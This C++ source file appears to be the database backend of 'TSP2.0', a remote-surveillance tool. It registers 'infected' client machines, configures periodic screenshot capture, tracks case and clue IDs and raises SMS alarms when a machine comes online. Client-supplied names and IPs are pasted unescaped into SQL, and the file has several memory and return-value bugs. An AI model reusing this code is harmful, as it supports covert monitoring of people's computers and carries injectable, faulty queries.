
/*************************************

add by menglz
for tsp2.0  

*************************************/


#include "stdafx.h"
#include "TSPClientPublic.h"
#include "crc32.h"
#include "TSP2_OnLine.h"
#include "TSPSMSAlarm.h"
#include "Log.h"

#include "MyDBConn.h"


extern CMyDataBase  MyDataBase;



#pragma comment(lib,"libmysql.lib")

#define  CRC32_APOLY  0x04C10DB7

#define  OFFLINE_SLEEP_TIME  300






//UTF-8到GB2312的转换
char* U2G(const char* utf8)
{
	int len = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
	wchar_t* wstr = new wchar_t[len+1];
	memset(wstr, 0, len+1);
	MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wstr, len);
	len = WideCharToMultiByte(CP_ACP, 0, wstr, -1, NULL, 0, NULL, NULL);
	char* str = new char[len+1];
	memset(str, 0, len+1);
	WideCharToMultiByte(CP_ACP, 0, wstr, -1, str, len, NULL, NULL);
	if(wstr) delete[] wstr;
	return str;
}
//GB2312到UTF-8的转换
char* G2U(const char* gb2312)
{
	int len = MultiByteToWideChar(CP_ACP, 0, gb2312, -1, NULL, 0);
	wchar_t* wstr = new wchar_t[len+1];
	memset(wstr, 0, len+1);
	MultiByteToWideChar(CP_ACP, 0, gb2312, -1, wstr, len);
	len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
	char* str = new char[len+1];
	memset(str, 0, len+1);
	WideCharToMultiByte(CP_UTF8, 0, wstr, -1, str, len, NULL, NULL);
	if(wstr) delete[] wstr;
	return str;
}




















BOOL TSP_2_OnLine(PINFO_DB_CONTRAST p_db_contrast)
{
	
	BOOL bRes = FALSE;

	

#ifdef _MYDEBUG
	g_log.Log(LEVEL_INFO,"机器：%s上线\n",p_db_contrast->szHardID);

#endif
	
	TCHAR strMmId[1024]={0};
	TCHAR *pSQL = NULL;
	pSQL = (TCHAR *)malloc(1024);

	if(NULL == pSQL)
	{

#ifdef _MYDEBUG
		g_log.Log(LEVEL_ERROR,"上线时pSQL申请内存失败\n");

#endif

		goto TSP2_ONLINE_FUNC_END;
	}

	memset(pSQL,0,1024);


	unsigned long ulMID = crc32((const unsigned char *)p_db_contrast->szHardID,strlen(p_db_contrast->szHardID));

	sprintf(pSQL,"select * from machine_info where mid=%lu;",ulMID);

#ifdef _MYDEBUG1
	
	g_log.Log(LEVEL_INFO,"%s\n",pSQL);

#endif

	MYSQL_RES	*result = NULL;
		

		
	result = 	MyDataBase.GetDataSet(pSQL);


	
	if(NULL == result)
	{
		MyDataBase.ReConnDB();
		
		g_log.Log(LEVEL_INFO,"机器ID：%lu，数据库中记录为空\n",ulMID);
		goto TSP2_ONLINE_FUNC_END;	

	}
	else
	{
		g_log.Log(LEVEL_INFO,"机器ID：%lu，数据库中记录不为空\n",ulMID);

	}

	
	//if(NULL != result)
	{



#ifdef _MYDEBUG1

		g_log.Log(LEVEL_INFO,"%s\n",pSQL);

#endif



		TCHAR tchTime[50];
		memset(&tchTime,0,sizeof(tchTime));

		time_t now;
		time(&now);

		strftime(tchTime,sizeof(tchTime),"%Y-%m-%d %H:%M:%S",localtime(&now));

		int result_count = 0;
		


		result_count = mysql_num_rows(result);

		
		if(NULL != result)
		{
			

			MyDataBase.FreeResult(result);
			result = NULL;


		}

		
		result = NULL;


		
		if(result_count <=0)
		{
			
			
			
			
			//插入机器信息表
			
			memset(pSQL,0,1024);


			TCHAR *tchUtf8MName = G2U(p_db_contrast->szComputerName);

			sprintf(pSQL,
				"insert into machine_info(mid,mname,innet,outernet,infecttime,impflag,criminaldesc,onlineflag) values(%lu,'%s','%s','%s','%s',0,NULL,1)",
				ulMID,tchUtf8MName,p_db_contrast->IPLAN,p_db_contrast->IPWAN,tchTime);

			free(tchUtf8MName);
			tchUtf8MName = NULL;

			
			if(!MyDataBase.ExeSQL(pSQL))
			{
				
#ifdef _MYDEBUG
				
				g_log.Log(LEVEL_ERROR,"执行sql出错[%s]\n",pSQL);
#endif

				goto TSP2_ONLINE_FUNC_END;
			}


#ifdef _MYDEBUG1

			g_log.Log(LEVEL_INFO,"%s\n",pSQL);

#endif




			// 插入截屏配置表



			memset(pSQL,0,1024);

			sprintf(pSQL,"insert into capture_setting(mid,capquality,`interval`,capset) values(%lu,4,120,'0,0,0,1');",ulMID);


			if(!MyDataBase.ExeSQL(pSQL))
			{



#ifdef _MYDEBUG

				g_log.Log(LEVEL_ERROR,"%s\n",pSQL);

#endif
				
				memset(pSQL,0,1024);

				sprintf(pSQL,"delete from machine_info where mid =%u;",ulMID);


				MyDataBase.ExeSQL(pSQL);

				
				goto TSP2_ONLINE_FUNC_END;
			}









			memset(pSQL,0,1024);


#ifdef _MYDEBUG1

			g_log.Log(LEVEL_INFO,"案件ID=%s,线索ID=%s\n",p_db_contrast->szCaseID,p_db_contrast->szClueID);


#endif

			if( (lstrlen(p_db_contrast->szCaseID) ==0) || (lstrlen(p_db_contrast->szClueID) == 0)  || 
				(strstr(p_db_contrast->szCaseID,"x") != NULL) || (strstr(p_db_contrast->szClueID,"x") != NULL)  
				)
			{
			
				sprintf(pSQL,
					"insert into function_setting(caseid,clueid,mid) values(-1,-1,%lu);",
					ulMID);

				//add by zhenyu
				sprintf(strMmId,
					"insert into um_setting(mid,userid) values(%lu,-1);",ulMID);
				//



			}
			else
			{

				sprintf(pSQL,
					"insert into function_setting(caseid,clueid,mid) values(%d,%d,%lu);",
					atol(p_db_contrast->szCaseID),atol(p_db_contrast->szClueID),ulMID);

				//add by zhenyu
				sprintf(strMmId,
					"insert into um_setting(mid,userid) values(%lu,%d);",ulMID,atol(p_db_contrast->szCaseID));
				//
			}


#ifdef _MYDEBUG1

			g_log.Log(LEVEL_INFO,"%s\n",pSQL);

#endif


			//add by zhenyu
			if(!MyDataBase.ExeSQL(strMmId))
			{

				MyDataBase.ReConnDB();

#ifdef _MYDEBUG

				g_log.Log(LEVEL_ERROR,"执行sql出错[%s]\n",strMmId);
#endif

				memset(strMmId,0,1024);

				sprintf(pSQL,"delete from machine_info where mid =%u;",ulMID);


				MyDataBase.ExeSQL(strMmId);


#ifdef _MYDEBUG

				g_log.Log(LEVEL_ERROR,"执行sql出错[%s]\n",strMmId);
#endif

				goto TSP2_ONLINE_FUNC_END;
			}

		// add end






			if(!MyDataBase.ExeSQL(pSQL))
			{
				
				MyDataBase.ReConnDB();

#ifdef _MYDEBUG

				g_log.Log(LEVEL_ERROR,"执行sql出错[%s]\n",pSQL);
#endif
				
				memset(pSQL,0,1024);

				sprintf(pSQL,"delete from machine_info where mid =%u;",ulMID);


				MyDataBase.ExeSQL(pSQL);


#ifdef _MYDEBUG

				g_log.Log(LEVEL_ERROR,"执行sql出错[%s]\n",pSQL);
#endif

				goto TSP2_ONLINE_FUNC_END;
			}


				
		
		}
		else
		{


			//更新机器表
			
			memset(pSQL,0,1024);
			//sprintf(pSQL,"update machine_info set onlineflag = 1 where mid = %lu;",ulMID);


			TCHAR *tchUtf8MName = G2U(p_db_contrast->szComputerName);

			sprintf(pSQL,"update machine_info set mname = '%s',innet = '%s',outernet = '%s',onlineflag = 1 where mid = %lu;",
				tchUtf8MName,p_db_contrast->IPLAN,p_db_contrast->IPWAN,ulMID);

			free(tchUtf8MName);
			tchUtf8MName = NULL;


#ifdef _MYDEBUG1


			g_log.Log(LEVEL_INFO,"%s\n",pSQL);


#endif


			if(!MyDataBase.ExeSQL(pSQL))
			{
				
#ifdef _MYDEBUG
				
				g_log.Log(LEVEL_ERROR,"%s\n",pSQL);

#endif
				//TSPsqlReConnect();  //这里不重新连接，只在开头出错重新连接数据库
				goto TSP2_ONLINE_FUNC_END;
				
			}





			//更新线索表



			if( (lstrlen(p_db_contrast->szCaseID) ==0) || (lstrlen(p_db_contrast->szClueID) == 0)  || 
				(strstr(p_db_contrast->szCaseID,"x") != NULL) || (strstr(p_db_contrast->szClueID,"x") != NULL)  
				)
			{

				//什么都不干

			}
			else
			{

				memset(pSQL,0,1024);

				memset(strMmId,0,1024);
				
				sprintf(pSQL,"update  function_setting set caseid = %d,clueid = %d  where mid = %u;",
					atol(p_db_contrast->szCaseID),atol(p_db_contrast->szClueID),ulMID);

				sprintf(strMmId,"update  um_setting set userid = %d  where mid = %u;",
					atol(p_db_contrast->szCaseID),ulMID);





#ifdef _MYDEBUG1


				g_log.Log(LEVEL_INFO,"%s\n",pSQL);


#endif


				//add by zhenyu
				if(!MyDataBase.ExeSQL(strMmId))
				{


#ifdef _MYDEBUG

					g_log.Log(LEVEL_ERROR,"%s\n",strMmId);
#endif

					goto TSP2_ONLINE_FUNC_END;
				}

				// add end





				if(!MyDataBase.ExeSQL(pSQL))
				{

#ifdef _MYDEBUG

					g_log.Log(LEVEL_ERROR,"%s\n",pSQL);

#endif
					//TSPsqlReConnect();  //这里不重新连接，只在开头出错重新连接数据库
					goto TSP2_ONLINE_FUNC_END;

				}




			}







		
		}

			
		//插入上线记录
		memset(pSQL,0,1024);
		sprintf(pSQL,
			"insert into online_rec(mid,onlinetime,offlinetime) values(%lu,'%s',NULL);",
			ulMID,tchTime);

		
#ifdef _MYDEBUG1

		g_log.Log(LEVEL_INFO,"%s\n",pSQL);


#endif


		if(!MyDataBase.ExeSQL(pSQL))
		{
			
			
#ifdef _MYDEBUG
			
			g_log.Log(LEVEL_ERROR,"%s\n",pSQL);

#endif

			
			goto TSP2_ONLINE_FUNC_END;
		}



		
		

		//插入截屏插件设置
		
		
		/*
		
		
		memset(pSQL,0,1024);

		sprintf(pSQL,"select * from capture_setting where mid=%lu;",ulMID);

		while(1)
		{
			result = TSPsqlOpenRecordset(pSQL);
			if(NULL != result)
			{
				break;
			}
			
#ifdef _MYDEBUG

			g_log.Log(LEVEL_ERROR,"结果集为空[%s]\n",pSQL);

#endif
			
			
			Sleep(200);
		}
		

		//if(NULL != result)
		{
			
			int res_count = 0;
			
			if(NULL != res_count)
			{
				res_count = mysql_num_rows(result);

			}
			
			

			if(res_count <= 0)
			{
				memset(pSQL,0,1024);

				sprintf(pSQL,"insert into capture_setting(mid,capquality,capset) values(%lu,1,'1,1,1')",ulMID);


				while(!TSPsqlExecuteSql(pSQL))
				{
					
					
					
#ifdef _MYDEBUG
					
					g_log.Log(LEVEL_ERROR,"%s\n",pSQL);

#endif

					Sleep(5000);
					TSPsqlReConnect();
				}

			
			}
		
		}

		if(NULL != result)
		{
			mysql_free_result(result);//释放结果资源,不释放数据库连接，以备后续使用
		}
		result = NULL;
		
*/

	
	}




	bRes = TRUE;
	

TSP2_ONLINE_FUNC_END:


	if(NULL != pSQL)
	{
		free(pSQL);
		pSQL = NULL;
	}

	if(bRes)
	{


#ifdef _MYDEBUG1

		g_log.Log(LEVEL_INFO,"开始调用短信报警%u\n",ulMID);

#endif


		TSPSMSAlarm(ulMID);  //短信报警


	}

	
	return bRes;

}



BOOL TSP_2_OffLine(TCHAR *pHardID)
{

#ifdef _MYDEBUG1

	g_log.Log(LEVEL_INFO,"机器下线，机器ID:%s\n",pHardID);


#endif

	if( (NULL == pHardID) || (strlen(pHardID) == 0))
	{
		

#ifdef _MYDEBUG

		
		g_log.Log(LEVEL_ERROR,"机器ID为空，下线程序退出\n");

#endif

		return FALSE;
	
	}

	unsigned long ulMID = crc32((const unsigned char *)pHardID,strlen(pHardID));


	TCHAR *pSQL = NULL;
	pSQL = (TCHAR *)malloc(1024);

	if(NULL == pSQL)
	{
		
		
		
	
#ifdef _MYDEBUG
		
		g_log.Log(LEVEL_ERROR,"下线时pSQL申请内存失败\n");

#endif

		return FALSE;
	}

	memset(pSQL,0,1024);

	sprintf(pSQL,"update machine_info set onlineflag = 0 where mid = %lu;",ulMID);

	
#ifdef _MYDEBUG1
	
	g_log.Log(LEVEL_INFO,"%s\n",pSQL);

#endif

	while(!MyDataBase.ExeSQL(pSQL))
	{
		Sleep(OFFLINE_SLEEP_TIME);


		g_log.Log(LEVEL_ERROR,"执行出错重新连接%s\n",pSQL);

		MyDataBase.ReConnDB();
	}	

	
	memset(pSQL,0,1024);

	sprintf(pSQL,"SELECT MAX(id) FROM online_rec WHERE  MID = %lu and offlinetime is NULL;",ulMID);

	
#ifdef _MYDEBUG1
	
	
	g_log.Log(LEVEL_INFO,"%s\n",pSQL);

#endif

	
	MYSQL_RES	*result = NULL;


	while(1)
	{
		
		result = MyDataBase.GetDataSet(pSQL);
		
		if(NULL != result)
		{
			break;
		}

		
		Sleep(OFFLINE_SLEEP_TIME);


		g_log.Log(LEVEL_ERROR,"执行出错重新连接%s\n",pSQL);

		MyDataBase.ReConnDB();
	}	




	if(NULL != result)
	{
		
		MYSQL_ROW	row;

		row = mysql_fetch_row(result);

		if( (NULL != row) && (NULL != row[0])  &&(0 != strlen(row[0])) )
		{
		
			unsigned long ulOnlineRecId = atol(row[0]);

			memset(pSQL,0,1024);

			time_t now;
			TCHAR tchTime[50];
			memset(&tchTime,0,sizeof(tchTime));

			time(&now);

			strftime(tchTime,sizeof(tchTime),"%Y-%m-%d %H:%M:%S",localtime(&now));

			memset(pSQL,0,1024);

			sprintf(pSQL,"update online_rec set offlinetime = '%s' where id = %lu;",tchTime,ulOnlineRecId);

			
			
#ifdef _MYDEBUG1
			
			
			g_log.Log(LEVEL_INFO,"%s\n",pSQL);


#endif

			while(!MyDataBase.ExeSQL(pSQL))
			{
				g_log.Log(LEVEL_ERROR,"%s",pSQL);
				Sleep(OFFLINE_SLEEP_TIME);
				MyDataBase.ReConnDB();
			}	


		
		}

	
	
	}
	
	


	free(pSQL);
	pSQL = NULL;


}
















BOOL TSP_2_OffLineAll()
{



#ifdef _MYDEBUG

	g_log.Log(LEVEL_ERROR,"进入offlineAll\n");

#endif

	


	TCHAR *pSQL = NULL;
	pSQL = (TCHAR *)malloc(1024);

	if(NULL == pSQL)
	{




#ifdef _MYDEBUG

		g_log.Log(LEVEL_ERROR,"offlineall下线时pSQL申请内存失败\n");

#endif

		return FALSE;
	}

	memset(pSQL,0,1024);

	sprintf(pSQL,"update machine_info set onlineflag = 0;");


#ifdef _MYDEBUG

	g_log.Log(LEVEL_INFO,"%s\n",pSQL);

#endif

	while(!MyDataBase.ExeSQL(pSQL))
	{
		Sleep(1000);
		MyDataBase.ReConnDB();
	}	


	

	memset(pSQL,0,1024);

	time_t now;
	TCHAR tchTime[50];
	memset(&tchTime,0,sizeof(tchTime));

	time(&now);

	strftime(tchTime,sizeof(tchTime),"%Y-%m-%d %H:%M:%S",localtime(&now));

	memset(pSQL,0,1024);

	sprintf(pSQL,"update online_rec set offlinetime = '%s' where offlinetime is NULL;",tchTime);



#ifdef _MYDEBUG


			g_log.Log(LEVEL_INFO,"%s\n",pSQL);


#endif

	while(!MyDataBase.ExeSQL(pSQL))
	{
		g_log.Log(LEVEL_ERROR,"%s",pSQL);
		Sleep(1000);
		MyDataBase.ReConnDB();
	}	



		


	free(pSQL);
	pSQL = NULL;


	return TRUE;


}